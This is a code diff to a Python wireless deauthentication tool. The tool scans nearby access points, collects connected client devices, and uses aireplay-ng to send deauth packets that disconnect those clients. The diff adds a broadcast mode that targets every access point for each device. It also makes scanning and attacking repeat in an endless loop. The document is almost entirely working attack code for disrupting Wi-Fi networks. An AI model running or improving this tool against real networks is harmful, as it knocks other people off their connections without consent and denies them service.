@@ -57,7 +57,7 @@ def parse_devices(d):
 
 	return devices
 
-def deauth(iface, packets, aps):
+def deauth(iface, packets, aps, broadcast):
 	print('[*] Starting DeAuth..')
 
 	while True:
@@ -68,8 +68,17 @@ def deauth(iface, packets, aps):
 			print('[*] Manually changing {0} to channel {1}'.format(iface, ap['channel']))
 			subprocess.call(['iwconfig', iface, 'channel', ap['channel']]) 
 			for device in ap['devices']:
-				print('[*] Sending {0} DeAuth packets from {1} to {2} on channel {3}'.format(packets, device, ap['bssid'], ap['channel']))
-				p = subprocess.call(['aireplay-ng', '-0', str(packets), '-a', ap['bssid'], '-c', device, iface])
+				if broadcast:
+					for a in aps:
+						a = aps[a]
+						print('[*] Broadcast enabled')
+						print('[*] Manually changing {0} to channel {1}'.format(iface, a['channel']))
+						subprocess.call(['iwconfig', iface, 'channel', a['channel']]) 
+						print('[*] Sending {0} DeAuth packets from {1} to {2} on channel {3}'.format(packets, device, a['bssid'], a['channel']))
+						p = subprocess.Popen(['aireplay-ng', '-0', str(packets), '-a', a['bssid'], '-c', device, iface])
+				else:
+					print('[*] Sending {0} DeAuth packets from {1} to {2} on channel {3}'.format(packets, device, ap['bssid'], ap['channel']))
+					p = subprocess.Popen(['aireplay-ng', '-0', str(packets), '-a', ap['bssid'], '-c', device, iface])
 
 def save(aps, f):
 	with open(f, 'w') as fp:
@@ -83,6 +92,8 @@ def main():
 	parser.add_argument('--packets', '-p', default=3, type=int, help='Number of DeAuth packets per device')
 	parser.add_argument('--write', '-w', type=str, help='Write scanning to file')
 	parser.add_argument('--load', '-l', type=str, help='Load previous scan')
+	parser.add_argument('--broadcast', '-b', type=int, help='Broadcast? XD')
+	parser.add_argument('--nonstop', type=int, help='Nonstop')
 	args = parser.parse_args()
 
 	aps = {}
@@ -92,7 +103,7 @@ def main():
 	if args.load:
 		with open(args.load) as fp:
 			aps = json.load(fp)
-			deauth(args.interface, args.packets, aps)
+			deauth(args.interface, args.packets, aps, args.broadcast)
 			exit()
 
 	print('[*] Setting up interface {0} to mode monitor..'.format(args.interface))
@@ -107,20 +118,21 @@ def main():
 	if args.write:
 		save(aps, args.write)
 
-	for ap in aps:
-		print('\n[*] Manually changing {0} channel to {1}..'.format(args.interface, aps[ap]['channel']))
-		subprocess.call(['iwconfig', args.interface, 'channel', aps[ap]['channel']]) 
-		print('[*] Gathering devices for AP {0}@{1} ({2}/{3} - {4} seconds remaining)..'.format(aps[ap]['essid'], ap, aps_count, len(aps), args.ctime * (len(aps) - aps_count)))
-		devices_data = gather_devices(args.interface, aps[ap], args.ctime)
-		aps[ap]['devices'] = parse_devices(devices_data)
-		devices_count = devices_count + len(aps[ap]['devices'])
-		print('[*] Gathered {0} devices. {1} Total of {2}.'.format(len(aps[ap]['devices']), [d for d in aps[ap]['devices']], devices_count))
-		aps_count = aps_count + 1
+	while True:
+		for ap in aps:
+			print('\n[*] Manually changing {0} channel to {1}..'.format(args.interface, aps[ap]['channel']))
+			subprocess.call(['iwconfig', args.interface, 'channel', aps[ap]['channel']]) 
+			print('[*] Gathering devices for AP {0}@{1} ({2}/{3} - {4} seconds remaining)..'.format(aps[ap]['essid'], ap, aps_count, len(aps), args.ctime * (len(aps) - aps_count)))
+			devices_data = gather_devices(args.interface, aps[ap], args.ctime)
+			aps[ap]['devices'] = parse_devices(devices_data)
+			devices_count = devices_count + len(aps[ap]['devices'])
+			print('[*] Gathered {0} devices. {1} Total of {2}.'.format(len(aps[ap]['devices']), [d for d in aps[ap]['devices']], devices_count))
+			aps_count = aps_count + 1
 
-		if args.write:
-			save(aps, args.write)
+			if args.write:
+				save(aps, args.write)
 
-	deauth(args.interface, args.packets, aps)
+		deauth(args.interface, args.packets, aps, args.broadcast)
 
 if __name__ == '__main__':
 	main()
